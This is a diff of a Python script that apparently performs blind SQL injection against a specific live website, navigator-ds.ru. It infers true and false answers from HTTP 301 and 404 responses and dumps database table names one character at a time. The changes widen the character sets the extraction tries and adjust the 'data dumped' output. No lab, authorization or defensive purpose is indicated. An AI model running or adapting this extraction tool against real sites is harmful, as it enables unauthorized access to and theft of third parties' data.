@@ -22,7 +22,7 @@ usr_column = args.column
 url = "https://www.navigator-ds.ru/articles/92" 
 true_code = 301
 false_code = 404  
-special_chars = "_.@-"
+special_chars = "_.@-:;,/|!#$%^&*(){}[]=+~"
 
 async def send_payload(mode, table, column, offset, position, num, char, session, operator='='):
     #print(f"mode={mode}, table={table}, column={column}, offset={offset}, position={position}, nums={nums}, char={char}, session={session}")
@@ -112,7 +112,7 @@ async def extract_table_name():
     #entity_name = ""
     position = 1
     offset = usr_offset
-    chars = sorted(string.ascii_letters + string.digits + "{}$()")
+    chars = sorted(string.ascii_lowercase + string.digits + "{}$()")
     nums = [str(i) for i in range(501)]
     entity_counter = 0
     
@@ -158,7 +158,7 @@ async def extract_table_name():
                             position += 1
                         else:
                             sys.stdout.write("\n")
-                            print("[+] done. data dumped: ", general_name)
+                            print(f"[+] done. data dumped: [{general_name}]\n")
                             offset += 1
                             position = 1
                             general_name = ""
